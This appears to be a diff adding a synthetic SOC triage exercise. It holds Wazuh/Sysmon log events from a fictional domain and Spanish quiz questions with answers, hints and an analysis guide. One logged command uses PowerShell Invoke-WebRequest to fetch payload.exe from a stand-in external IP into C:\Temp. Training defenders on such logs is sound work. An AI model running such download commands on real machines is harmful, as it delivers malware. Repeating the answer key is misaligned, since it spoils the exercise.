@@ -1,0 +1,389 @@
+{
+  "logs": [
+    {
+      "id": 21,
+      "timestamp": "2026-08-17T03:00:00.000-05:00",
+      "rule": {
+        "id": "8910",
+        "level": 3,
+        "description": "Process Creation (Sysmon)",
+        "firedtimes": 1,
+        "groups": ["sysmon", "process"]
+      },
+      "agent": {
+        "id": "009",
+        "name": "DEV-WS-05",
+        "ip": "10.20.20.105"
+      },
+      "manager": {
+        "name": "wazuh-manager"
+      },
+      "full_log": "Process Create:\nRuleName: -\nUtcTime: 2026-08-17 03:00:00.000\nProcessGuid: {a1b2c3d4-e5f6-7890-abcd-ef1234567890}\nProcessId: 7890\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: powershell.exe -c \"Invoke-WebRequest -Uri http://198.51.100.10/payload.exe -OutFile C:\\Temp\\payload.exe\"\nCurrentDirectory: C:\\Users\\avega\\Documents\nUser: TRIAGERANGE\\avega\nLogonGuid: ...\nLogonId: ...\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: ...\nParentProcessGuid: ...\nParentProcessId: 4567\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: cmd.exe /c \"powershell ...\"",
+      "predecoder": {
+        "program_name": "Microsoft-Windows-Sysmon",
+        "hostname": "DEV-WS-05",
+        "timestamp": "Aug 17 03:00:00"
+      },
+      "decoder": {
+        "name": "sysmon"
+      },
+      "data": {
+        "process": {
+          "name": "powershell.exe",
+          "pid": 7890,
+          "command_line": "powershell.exe -c \"Invoke-WebRequest -Uri http://198.51.100.10/payload.exe -OutFile C:\\Temp\\payload.exe\"",
+          "user": "avega"
+        }
+      },
+      "location": "Sysmon"
+    },
+    {
+      "id": 22,
+      "timestamp": "2026-08-17T03:00:02.000-05:00",
+      "rule": {
+        "id": "8920",
+        "level": 3,
+        "description": "Network Connection (Sysmon)",
+        "firedtimes": 1,
+        "groups": ["sysmon", "network"]
+      },
+      "agent": {
+        "id": "009",
+        "name": "DEV-WS-05",
+        "ip": "10.20.20.105"
+      },
+      "manager": {
+        "name": "wazuh-manager"
+      },
+      "full_log": "Network connection detected:\nRuleName: -\nUtcTime: 2026-08-17 03:00:02.000\nProcessGuid: {a1b2c3d4-e5f6-7890-abcd-ef1234567890}\nProcessId: 7890\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nUser: TRIAGERANGE\\avega\nProtocol: tcp\nInitiated: true\nSourceIsIpv6: false\nSourceIp: 10.20.20.105\nSourcePort: 49152\nDestinationIsIpv6: false\nDestinationIp: 198.51.100.10\nDestinationPort: 80",
+      "predecoder": {
+        "program_name": "Microsoft-Windows-Sysmon",
+        "hostname": "DEV-WS-05",
+        "timestamp": "Aug 17 03:00:02"
+      },
+      "decoder": {
+        "name": "sysmon"
+      },
+      "data": {
+        "srcip": "10.20.20.105",
+        "dstip": "198.51.100.10",
+        "dstport": 80,
+        "process": "powershell.exe"
+      },
+      "location": "Sysmon"
+    },
+    {
+      "id": 23,
+      "timestamp": "2026-08-17T03:00:05.000-05:00",
+      "rule": {
+        "id": "8940",
+        "level": 3,
+        "description": "File Creation (Sysmon)",
+        "firedtimes": 1,
+        "groups": ["sysmon", "file"]
+      },
+      "agent": {
+        "id": "009",
+        "name": "DEV-WS-05",
+        "ip": "10.20.20.105"
+      },
+      "manager": {
+        "name": "wazuh-manager"
+      },
+      "full_log": "File created:\nRuleName: -\nUtcTime: 2026-08-17 03:00:05.000\nProcessGuid: {a1b2c3d4-e5f6-7890-abcd-ef1234567890}\nProcessId: 7890\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetFilename: C:\\Temp\\payload.exe\nCreationUtcTime: 2026-08-17 03:00:05.000\nUser: TRIAGERANGE\\avega",
+      "predecoder": {
+        "program_name": "Microsoft-Windows-Sysmon",
+        "hostname": "DEV-WS-05",
+        "timestamp": "Aug 17 03:00:05"
+      },
+      "decoder": {
+        "name": "sysmon"
+      },
+      "data": {
+        "file": {
+          "path": "C:\\Temp\\payload.exe",
+          "process": "powershell.exe",
+          "user": "avega"
+        }
+      },
+      "location": "Sysmon"
+    },
+    {
+      "id": 24,
+      "timestamp": "2026-08-17T02:50:00.000-05:00",
+      "rule": {
+        "id": "5715",
+        "level": 3,
+        "description": "sshd: Authentication success",
+        "firedtimes": 1,
+        "groups": ["authentication_success", "sshd"]
+      },
+      "agent": {
+        "id": "002",
+        "name": "SRV-PROXY01",
+        "ip": "10.20.30.1"
+      },
+      "manager": {
+        "name": "wazuh-manager"
+      },
+      "full_log": "Accepted password for amorales from 10.20.6.5 port 22 ssh2",
+      "predecoder": {
+        "program_name": "sshd",
+        "hostname": "SRV-PROXY01",
+        "timestamp": "Aug 17 02:50:00"
+      },
+      "decoder": {
+        "name": "sshd"
+      },
+      "data": {
+        "srcip": "10.20.6.5",
+        "dstuser": "amorales"
+      },
+      "location": "sshd"
+    },
+    {
+      "id": 25,
+      "timestamp": "2026-08-17T02:55:00.000-05:00",
+      "rule": {
+        "id": "6010",
+        "level": 3,
+        "description": "Windows Logon Success",
+        "firedtimes": 1,
+        "groups": ["authentication_success"]
+      },
+      "agent": {
+        "id": "009",
+        "name": "DEV-WS-05",
+        "ip": "10.20.20.105"
+      },
+      "manager": {
+        "name": "wazuh-manager"
+      },
+      "full_log": "An account was successfully logged on.\n... Source Network Address: 10.20.20.105 ... TargetUserName: avega ...",
+      "predecoder": {
+        "program_name": "Microsoft-Windows-Security-Auditing",
+        "hostname": "DEV-WS-05",
+        "timestamp": "Aug 17 02:55:00"
+      },
+      "decoder": {
+        "name": "windows"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "EventID": 4624,
+            "Computer": "DEV-WS-05.triagerange.local"
+          },
+          "eventdata": {
+            "TargetUserName": "avega",
+            "SourceNetworkAddress": "10.20.20.105"
+          }
+        }
+      },
+      "location": "EventLog"
+    },
+    {
+      "id": 26,
+      "timestamp": "2026-08-17T03:05:00.000-05:00",
+      "rule": {
+        "id": "8910",
+        "level": 3,
+        "description": "Process Creation (Sysmon)",
+        "firedtimes": 1,
+        "groups": ["sysmon", "process"]
+      },
+      "agent": {
+        "id": "001",
+        "name": "FIN-DESK-22",
+        "ip": "10.20.4.22"
+      },
+      "manager": {
+        "name": "wazuh-manager"
+      },
+      "full_log": "Process Create:\n... Image: C:\\Windows\\System32\\notepad.exe ... User: TRIAGERANGE\\lgomez ...",
+      "predecoder": {
+        "program_name": "Microsoft-Windows-Sysmon",
+        "hostname": "FIN-DESK-22",
+        "timestamp": "Aug 17 03:05:00"
+      },
+      "decoder": {
+        "name": "sysmon"
+      },
+      "data": {
+        "process": "notepad.exe",
+        "user": "lgomez"
+      },
+      "location": "Sysmon"
+    },
+    {
+      "id": 27,
+      "timestamp": "2026-08-17T03:10:00.000-05:00",
+      "rule": {
+        "id": "6020",
+        "level": 3,
+        "description": "Network Share Access",
+        "firedtimes": 1,
+        "groups": ["share"]
+      },
+      "agent": {
+        "id": "010",
+        "name": "SRV-FS01",
+        "ip": "10.20.10.30"
+      },
+      "manager": {
+        "name": "wazuh-manager"
+      },
+      "full_log": "A network share object was accessed.\n... Share Name: \\\\*\\Backup ... Access Mask: 0x1 ... Subject: triagerange\\svc_backup ...",
+      "predecoder": {
+        "program_name": "Microsoft-Windows-Security-Auditing",
+        "hostname": "SRV-FS01",
+        "timestamp": "Aug 17 03:10:00"
+      },
+      "decoder": {
+        "name": "windows"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "EventID": 5140,
+            "Computer": "SRV-FS01.triagerange.local"
+          },
+          "eventdata": {
+            "TargetUserName": "svc_backup"
+          }
+        }
+      },
+      "location": "EventLog"
+    },
+    {
+      "id": 28,
+      "timestamp": "2026-08-17T03:15:00.000-05:00",
+      "rule": {
+        "id": "6011",
+        "level": 5,
+        "description": "Windows Logon Failure",
+        "firedtimes": 1,
+        "groups": ["authentication_failed"]
+      },
+      "agent": {
+        "id": "011",
+        "name": "IT-WS-07",
+        "ip": "10.20.6.7"
+      },
+      "manager": {
+        "name": "wazuh-manager"
+      },
+      "full_log": "An account failed to log on.\n... TargetUserName: hsanchez ... Source Network Address: 10.20.6.3 ...",
+      "predecoder": {
+        "program_name": "Microsoft-Windows-Security-Auditing",
+        "hostname": "IT-WS-07",
+        "timestamp": "Aug 17 03:15:00"
+      },
+      "decoder": {
+        "name": "windows"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "EventID": 4625,
+            "Computer": "IT-WS-07.triagerange.local"
+          },
+          "eventdata": {
+            "TargetUserName": "hsanchez",
+            "SourceNetworkAddress": "10.20.6.3"
+          }
+        }
+      },
+      "location": "EventLog"
+    },
+    {
+      "id": 29,
+      "timestamp": "2026-08-17T03:20:00.000-05:00",
+      "rule": {
+        "id": "8950",
+        "level": 3,
+        "description": "DNS Query (Sysmon)",
+        "firedtimes": 1,
+        "groups": ["sysmon", "dns"]
+      },
+      "agent": {
+        "id": "009",
+        "name": "DEV-WS-05",
+        "ip": "10.20.20.105"
+      },
+      "manager": {
+        "name": "wazuh-manager"
+      },
+      "full_log": "DNS query:\nRuleName: -\nUtcTime: 2026-08-17 03:20:00.000\nProcessGuid: ...\nProcessId: 1234\nQueryName: google.com\nQueryStatus: 0\nQueryResults: 8.8.8.8\n... User: TRIAGERANGE\\avega",
+      "predecoder": {
+        "program_name": "Microsoft-Windows-Sysmon",
+        "hostname": "DEV-WS-05",
+        "timestamp": "Aug 17 03:20:00"
+      },
+      "decoder": {
+        "name": "sysmon"
+      },
+      "data": {
+        "query": "google.com",
+        "user": "avega"
+      },
+      "location": "Sysmon"
+    },
+    {
+      "id": 30,
+      "timestamp": "2026-08-17T03:25:00.000-05:00",
+      "rule": {
+        "id": "6030",
+        "level": 3,
+        "description": "Scheduled Task Created",
+        "firedtimes": 1,
+        "groups": ["task"]
+      },
+      "agent": {
+        "id": "012",
+        "name": "SRV-DC01",
+        "ip": "10.20.10.10"
+      },
+      "manager": {
+        "name": "wazuh-manager"
+      },
+      "full_log": "A scheduled task was created.\n... Task Name: \\Microsoft\\Windows\\Update\\SecurityUpdate ... User: triagerange\\Administrator ...",
+      "predecoder": {
+        "program_name": "Microsoft-Windows-Security-Auditing",
+        "hostname": "SRV-DC01",
+        "timestamp": "Aug 17 03:25:00"
+      },
+      "decoder": {
+        "name": "windows"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "EventID": 4698,
+            "Computer": "SRV-DC01.triagerange.local"
+          },
+          "eventdata": {
+            "TaskName": "SecurityUpdate",
+            "User": "Administrator"
+          }
+        }
+      },
+      "location": "EventLog"
+    }
+  ],
+  "questions": [
+    {
+      "text": "¿Qué proceso se ejecutó para descargar el archivo malicioso?",
+      "answer": "powershell.exe",
+      "acceptable": ["powershell.exe", "PowerShell", "powershell"],
+      "hint": "Busca en los eventos de Sysmon la línea de comandos que contiene 'Invoke-WebRequest'."
+    },
+    {
+      "text": "¿Cuál es la dirección IP del servidor desde donde se descargó el malware?",
+      "answer": "198.51.100.10",
+      "acceptable": ["198.51.100.10"],
+      "hint": "Revisa la conexión de red realizada por el proceso powershell.exe."
+    }
+  ],
+  "analysis_guide": "Filtra los eventos de Sysmon en el agente DEV-WS-05. Observa la creación de un proceso powershell.exe con una línea de comandos que descarga un archivo desde una IP externa (198.51.100.10). Luego, se registra una conexión de red a esa IP y la creación del archivo descargado. Esto indica descarga de malware."
+}
